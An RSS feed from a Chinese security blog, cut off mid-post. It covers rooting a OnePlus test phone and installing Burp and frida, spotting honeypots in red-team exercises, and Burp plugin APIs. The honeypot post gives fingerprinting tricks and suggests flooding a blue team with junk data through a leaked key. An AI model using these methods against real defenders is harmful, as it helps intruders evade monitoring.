<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Y4ph3tS blog</title>
    <link>https://yaphetszz.github.io/</link>
    <description>Recent content on Y4ph3tS blog</description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Sat, 30 Nov 2024 12:00:00 +0800</lastBuildDate>
    <atom:link href="https://yaphetszz.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>写在前面——Reborn</title>
      <link>https://yaphetszz.github.io/posts/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2reborn/</link>
      <pubDate>Sat, 30 Nov 2024 12:00:00 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2reborn/</guid>
      <description>&lt;h1 id=&#34;博客重新上线&#34;&gt;博客重新上线&lt;/h1&gt;&#xA;&lt;p&gt;之前写过的博客因为各种各样的原因停更，加上之前笔记崩了，从后来恢复只剩二百多篇了😅😅😅&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../image.png&#34; alt=&#34;Alt text&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;从之前发的文章、议题、笔记里选了几篇重新整个博客，也算是记录一下吧，反正之前也是年更博主（手动狗头）&lt;/p&gt;&#xA;&lt;p&gt;现在文章少，用的第三方框架也没设计啥功能，等文章多了以后考虑对博客框架进行二开&amp;hellip;&lt;/p&gt;</description>
    </item>
    <item>
      <title>一加测试机从环境配置到救砖全攻略</title>
      <link>https://yaphetszz.github.io/posts/%E4%B8%80%E5%8A%A0%E6%B5%8B%E8%AF%95%E6%9C%BA%E4%BB%8E%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%88%B0%E6%95%91%E7%A0%96%E5%85%A8%E6%94%BB%E7%95%A5/</link>
      <pubDate>Tue, 26 Apr 2022 06:14:00 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E4%B8%80%E5%8A%A0%E6%B5%8B%E8%AF%95%E6%9C%BA%E4%BB%8E%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%88%B0%E6%95%91%E7%A0%96%E5%85%A8%E6%94%BB%E7%95%A5/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;主要是公众号之前因为一些原因导致停更了，加上其他的原因很多东西其实都只沉积在个人笔记里了，刚好这两天入了个一加6T的测试机，配环境的时候也遇到了不少坑，但是在网上好像看文章别人配环境都是一马平川，就顺手把踩坑和解决的过程记录分享一下。&lt;/p&gt;&#xA;&lt;p&gt;首先装一下1+ USB Driver，官方论坛都能找到&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/39658ba5-f584-424a-b9d7-2a1df835d5f3.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;主要是为了让电脑检测到设备，然后安装驱动，官方论坛也有&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/5db877cd-69cc-4810-a60f-a4a7cef6ca1d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一步就已经遇到坑了，如果电脑上有模拟器虚拟机啥的没关干净，存在僵尸进程的时候是无法安装成功的，建议重启后安装，否则就会卡在执行命令。&lt;/p&gt;&#xA;&lt;p&gt;如果这两个包找不到，建议直接去找一个一加万能工具包，正常的工具包测试不带毒，如果是第三方渠道下载的建议扫一扫，不排除被投毒的可能。因为我在下的时候就遇到一个疑似被投毒的工具包，后续如果有时间可能会出一篇分析文章。&lt;/p&gt;&#xA;&lt;p&gt;打开开发者选项，允许USB调试和OEM解锁，然后使用adb命令解锁BootLoader&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/29127671.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用音量键选择解锁后电源键确认，这步忘了拍照了。然后重启进入系统需要重新打开开发者模式并启用USB调试&lt;/p&gt;&#xA;&lt;p&gt;接下来使用高级重启引导加载器，也可以用adb reboot recovery命令进行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/67ae3422-0a0c-4b8b-b9fd-279763e63154.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在设备管理器里确定驱动情况&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/d0d3d009-e6fa-4a42-af25-585dd8a94c3b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;准备好TWRP的包，使用fastboot命令进入临时系统&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/20e28879-5124-49ee-a8ad-7e3d847a1840.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;中间好像出了什么奇怪的问题，直接裂开&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/474cf285-7849-42a1-ba54-400d5031c520.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;怀疑是驱动也出了什么问题，似乎是高通的驱动问题？&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4db22e0c-63a1-41ff-a5d1-147db143c90e.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;于是网上下了个一加万能工具包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/ea3c3318-d1e4-42f4-b211-3f9467b52f4c.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;下完之后先把能装的驱动都装上，然后重刷一下系统，完成救砖之后降级了一下系统（原来是安卓11）降级到9或者10都可以，一加官方论坛是提供全量包的，可能由于系统版本原因导致无法刷入，降级之后重刷TWRP就成功了，可以改个语言，也可以不改&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/189d25e1-ed2f-45b7-a1a3-854dd367154d.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入高级-》Sideload-》滑块&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/16cc15a5-4298-494c-9dac-63a38b848014.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;将完整的twrp包刷入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/4b8f1348-6e1b-4436-8cde-225382f73007.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后重新进入恢复模式，重新进行sideload，刷入magisk&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b1105f71-7e4f-4703-ba34-c5387500e5b7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/528ad50a-2b36-43a5-9b38-c2b4f7bea8d8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;重启后magisk已安装，直接su即可切换到root&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/05594d79-4b71-47e9-977d-7c93fe3cce71.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;完成magisk安装后就已经root完了，现在就是一些基础的环境配置，建议装一下scrcpy这款神器，可以直接电脑操作，特别方便，截止发文的最新下载地址&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Genymobile/scrcpy/releases/tag/v1.23&#34;&gt;https://github.com/Genymobile/scrcpy/releases/tag/v1.23&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3d95b4f8-5e83-4e16-ab9f-1eca48040c9a.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来安装rirucore，在github获取官方包后用magisk装一下，当然进入recovery模式和之前一样用sideload也可以刷入，下载地址&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/RikkaApps/Riru/releases/&#34;&gt;https://github.com/RikkaApps/Riru/releases/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b5cb8168-7320-4c77-98d8-44660e722c76.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;重启之后没有出现新的软件图标，在magisk的模块中可以看到已经加载&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/91791d82-2dae-44aa-8443-9dd734c04d25.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续安装Edxposed的时候又出问题了，配个环境真就一直踩坑&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/846ccc88-e281-452a-ae1e-614e5bf792e0.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Edxposed检测不到Riru框架了，主要版本太新，还是降版本解决问题，使用25版本的Riru解决问题&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/908c7cca-3d83-4e8e-8a62-ade4b32f90bf.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;重启完就可以看到我们的Edxposed了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b97eea39-9564-4c56-af33-5caf20ff5232.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据提示安装完整版的Edxposed&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/367af7e1-e3c9-48a7-ad88-bd2379d3243f.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/a1f5f146-7a17-4727-8693-60275c5fa40f.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后就是一些常规的环境配置，比如BP的证书导入，由于Android7开始系统更改了信任用户安装的证书的默认行为，应用程序仅信任系统级CA，所以需要对证书进行一定的更改才能使用（其实这个文章也有很多人写过了，我这里就再水一水）&lt;/p&gt;&#xA;&lt;p&gt;建议重新生成BP证书，在Proxy-Options中进行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/c1cc0521-e630-4ce0-b15f-c5d63f0dfebe.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;对证书进行一波简单操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/084b0cdb-4a91-41d3-ab65-61f2a3c9ebd9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过ADB push将证书移到对应的目录下&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/e7b40647-c46b-4bb7-8646-50171fe20f37.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;测试一下访问百度可以正常抓到包，证书安装成功&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/81867ee0-63c7-440a-b88a-187cd07802aa.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接着再装一些基础环境比如frida等，可以按需进行配置&lt;/p&gt;&#xA;&lt;p&gt;顺便简单写一下frida的环境配置，首先去官网下载对应Python版本的frida包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/970a489c-b895-4eda-9c0d-08276089e688.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;下载完成后进行安装，一般在运行setup.py的时候会自动下载frida对应的egg，通常来说因为大家都懂的原因下载速度会很慢，只要找到输出的下载目录直接把刚刚下载的egg文件拖进去再重新执行install命令就行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/e7f01076-c9cf-46b9-9f29-ee0f16e96b59.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>浅析红蓝对抗中的蜜罐与虚拟机识别技术</title>
      <link>https://yaphetszz.github.io/posts/%E6%B5%85%E6%9E%90%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%AD%E7%9A%84%E8%9C%9C%E7%BD%90%E4%B8%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/</link>
      <pubDate>Mon, 15 Mar 2021 09:08:11 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E6%B5%85%E6%9E%90%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%AD%E7%9A%84%E8%9C%9C%E7%BD%90%E4%B8%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;蜜罐简介&#34;&gt;蜜罐简介&lt;/h2&gt;&#xA;&lt;p&gt;在以前，蜜罐是用来抓熊的。通过伪装成“食物”引诱熊前来享用，最后猎人再将熊一举拿下。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;到了今天，蜜罐技术已经成为网络安全中的一种入侵诱饵，目的是引诱黑客前来攻击，并收集黑客相关的证据和信息。所以蜜罐存在的意义就是——被攻击、被探测、被攻陷&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;根据部署方式，蜜罐可能被归类为：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;**生产蜜罐：**易于使用，仅捕获有限的信息，主要由公司使用。生产蜜罐被组织放置在生产网络内与其他生产服务器一起，以改善其整体安全状态。通常生产蜜罐是低交互蜜罐，更易于部署。与研究蜜罐相比，它们提供的攻击或攻击者信息较少。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;**研究蜜罐：**是为了收集有关针对不同网络的黑客社区的动机和策略的信息。这些蜜罐不会为特定组织增加直接价值; 相反，它们用于研究组织面临的威胁，并学习如何更好地防范这些威胁。研究蜜罐的部署和维护非常复杂，可以捕获大量信息，主要用于研究、军事或政府组织。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;目前红蓝对抗中使用的研究型蜜罐偏多，可以记录详细的信息以用于溯源&lt;/p&gt;&#xA;&lt;p&gt;蜜罐产品分类多样，功能也是各不相同，目前市场上常见的蜜罐非常多，商用成型的蜜罐产品随便一搜都有几十款之多。蜜罐从设计标准上来说分为纯蜜罐，高交互蜜罐，低交互蜜罐&lt;/p&gt;&#xA;&lt;p&gt;目前来看多数蜜罐为低交互蜜罐，优秀的产品均向高交互蜜罐方向发展，但是由于一些原因导致部分高交互蜜罐容易出现问题，可以被非常方便地检测出来。&lt;/p&gt;&#xA;&lt;p&gt;纯蜜罐通常来说只存在大量特征，用于单纯地应对扫描器的扫描，这种蜜罐的特征非常明显，访问时通常是空白页，但是在源码中可以看到为隐藏属性的大量关键字，通常用于应对扫描器的识别&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a2.png&#34; alt=&#34;image-20210315174111636&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在常见的识别工具例如Wappalyzer中也显示出了大量的识别结果（这是新版本的wappalyzer中的显示结果，低置信度的结果会在新版本中根据相应选择算法被丢弃，而在旧版本中会把所有触发检测规则的框架等全部包含，可能显示的数字高达数百至数千）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a3.png&#34; alt=&#34;image-20210315174341524&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;另一款主流蜜罐kippo，在Github上是一款评分相对非常高的蜜罐，遗憾的是已经很多年没有更新了，曾经作为一款蜜罐还是非常火热的，虽然最后一个release版本是14年发布的，但是去年仍有文章在写这款蜜罐&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210401110005363.png&#34; alt=&#34;image-20210401110005363&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;作为较老的蜜罐，其实通过shodan和fofa等网络空间资产搜索引擎还是发现了大量部署了该蜜罐的服务器和设备。根据分析提取特征后发现，这款蜜罐虽然当时比较优秀，但是特征还是很明显的。分析后总结如下：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;SSH版本固定，返回的banner信息为SSH-2.0-OpenSSH_5.1p1 Debian-5&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;构造畸形包来尝试请求连接，由于kippo协议实现的原因不会像正常的连接一样返回Protocol mismatch，可以作为另一点&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;基于以上两点就可以快速分辨出目标是否为kippo蜜罐，当然hvv的目标里应该见不太到这类古董了&lt;/p&gt;&#xA;&lt;p&gt;同样，还有一些低交互蜜罐则可以返回一些简单的命令，以互联网上一款非常热门的开源蜜罐Hfish为例，由于某些原因，我在本地搭建测试的为2020年12月发布的版本，在官方文档中看到的Hifish的描述如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a4.png&#34; alt=&#34;image-20210317102603325&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;定制蜜罐需要用户自行配置，例如我们在配置文件中可以看到相关服务的启停情况&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a5.png&#34; alt=&#34;image-20210317113955629&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过nmap扫描已经开启蜜罐的机器，通过服务识别时给我们的反馈如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a6.png&#34; alt=&#34;image-20210317114623361&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到启动的服务非常之多，常规机器上开启如此多服务的并不常见，开放大量端口的极有可能是蜜罐，另外在做信息收集时肯定会扫描网段，通常蜜罐不会只放置一台，在同一个C段搭数台蜜罐机器是很常见的，&lt;strong&gt;如果在同网段发现多数机器开放大量端口且端口相同，请求后的返回相似，有可能部署了一系列的蜜罐。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;另外一点检测蜜罐的方式就是通过命令交互&lt;/strong&gt;，Hfish的规则需要用户自己定义，以ssh为例，通过SSH登录蜜罐&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a7.png&#34; alt=&#34;image-20210317115146380&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一个问题就是命令需要自己配置，在ls命令时并没有看出什么明显的问题，但执行whoami和id时无法返回正确的结果，需要我们在配置文件中进行配置，配置文件中默认支持的指令写的非常少&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a8.png&#34; alt=&#34;image-20210317115611917&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当输入除此以外的命令时，即使输入为空也会返回test&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a9.png&#34; alt=&#34;image-20210317115812675&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此外，根据其默认提供的ls -all命令，我们也可以尝试一下，可以看到返回的时间均为2017年，明显早于现在，这也是其中一个较为明显的发现点。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a12.png&#34; alt=&#34;image-20210317180648863&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同样再来看一下我们在日常使用的kali上的执行结果，差别很明显就出来了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a13.png&#34; alt=&#34;image-20210317180800906&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在没有一定基础的用户使用的时候，通过该种类型的配置漏洞可以很方便地发现问题。不过此时的Hfish配置启用的是高交互ssh蜜罐（也是Hfish的默认配置选项），还可以被配置成低交互状态，此时不能执行命令可以使上述判断无效化，所有的登录请求都会被拒绝&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a10.png&#34; alt=&#34;image-20210317120245794&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候可以避免很多问题，但是经过扫描你会发现开放的端口中会有一些WEB服务，有可能目标机器是真实环境，并且部署了Hfish来捕获攻击，并且相关服务拟真，你无法判断目标服务的真实有效性。如果是蜜罐构造的WEB环境，很有可能存在纰漏，例如HFish的蜜罐构造的假WEB页面，其中只有两个js，并且x.js可以很明显的发现蜜罐特征，并且在溯源反制上，你可以直接通过泄露出的seckey给目标填塞大量的垃圾数据影响蓝队的判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210409182544926.png&#34; alt=&#34;image-20210409182544926&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在真实的wordpress中可以则看到大量js，这也可以用于判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210409183309237.png&#34; alt=&#34;image-20210409183309237&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同时还可以根据浏览器的发包请求来判断包内容，包中的钓鱼很明显就告诉攻击者这是个蜜罐&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210409190726775.png&#34; alt=&#34;image-20210409190726775&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;延续上文中讲的C段蜜罐，根据测试结果发现，大部分蜜罐的回应和发包的时间戳都是相对固定的，而物理服务器则会有偏差，通常物理服务器返回的时间戳会存在一定的偏差，我们通过抓包来复现了一下返回过程&lt;/p&gt;&#xA;&lt;p&gt;首先通过ssh连接机器并且执行了一些命令&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a14.png&#34; alt=&#34;image-20210318112534739&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;至所有命令执行结束时我们一共获取到了129个数据包，分析发出命令的包到收到回包的时间&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a15.png&#34; alt=&#34;image-20210318112706170&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a16.png&#34; alt=&#34;image-20210318113200808&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行前几条命令时响应时间为0.000148s,0.000105s,0.000132s&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;我们再开启蜜罐，为了防止其他因素影响，将返回值设置成与之前正常请求kali时相同，但是测试时发生了一个非常尴尬的情况，开启这款蜜罐后所有的传输都是TCP，并没有SSH&amp;hellip;又直接暴露了一个问题&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a17.png&#34; alt=&#34;image-20210318115157300&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a18.png&#34; alt=&#34;image-20210318115219075&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;所以根据协议进行识别是一个较为有效的方式，360Quake研究过不少蜜罐的协议实现，以下引用当时的研究结果：拿Dionaea 的Memcached协议举例，在实现Memcached协议时Dionaea把很多参数做了随机化，但是在一些参数如：version、libevent和rusage_user等都是固定的。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210409175349.jpg&#34; alt=&#34;微信图片_20210409175349&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;总结表如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210409175630.jpg&#34; alt=&#34;微信图片_20210409175630&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;相对其他协议的实现也可以进行深入研究，例如Mysql协议，近期在hvv前夕也涌现出了非常多的开源或闭源的Mysql蜜罐，检测此类蜜罐的步骤可分为如下几步：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;伪造客户端连接蜜罐mysql服务&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;连接成功发送mysql查询请求&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;接受mysql服务器响应，通过分析伪造的mysql客户端读取文件的数据包得到的报文结构：文件名长度+1 + \x00\x00\x01\xfb + 文件名&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（中）</title>
      <link>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%AD/</link>
      <pubDate>Fri, 08 Jan 2021 11:25:18 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%AD/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Burp的基础插件安装已经在上一篇文章中讲了，本篇主要讲BP插件的开发，毕竟别人的东西用起来还是自己写的香。本来这篇文章是准备全写完再发出来，但是发现内容真的有亿点点多还是决定拆一下。&lt;/p&gt;&#xA;&lt;p&gt;BP插件的开发语言支持Java和Python，由于BP本来就是Java开发的所以对Java的插件支持也更好，我们在后面的文章中JAVA开发和Python开发都会讲到。在找了半天资料后发现官方给出了一个&lt;a href=&#34;https://portswigger.net/burp/extender/api/index.html&#34;&gt;链接&lt;/a&gt;,这个连接中的文档描述了各种编写规则&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps86.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;还给出了一些&lt;a href=&#34;https://portswigger.net/burp/extender/&#34;&gt;实例&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先来讲讲BP开发的基础，了解一下API，来解读一下官方文档&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps87.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一个Interface IBurpCollaboratorClientContext&lt;/p&gt;&#xA;&lt;p&gt;这个接口用于生成payload并与collaborator服务器交互，通过轮询来得到网络交互的数据包。该类接口包含有以下方法，可以接收返回，生成payload，得到collaborator服务器地址等&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;Modifier and Type&lt;/th&gt;&#xA;          &lt;th&gt;Method and Description&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchAllCollaboratorInteractions()&#34;&gt;fetchAllCollaboratorInteractions&lt;/a&gt;() This method is used to retrieve all interactions received by the Collaborator server resulting from payloads that were generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchAllInfiltratorInteractions()&#34;&gt;fetchAllInfiltratorInteractions&lt;/a&gt;() This method is used to retrieve all interactions made by Burp Infiltrator instrumentation resulting from payloads that were generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a href=&#34;https://portswigger.net/burp/extender/api/burp/IBurpCollaboratorInteraction.html&#34;&gt;IBurpCollaboratorInteraction&lt;/a&gt;&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;#fetchCollaboratorInteractionsFor(java.lang.String)&#34;&gt;fetchCollaboratorInteractionsFor&lt;/a&gt;(java.lang.String payload) This method is used to retrieve interactions received by the Collaborator server resulting from a single payload that was generated for this context.&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;java.util.List&amp;lt;&lt;a 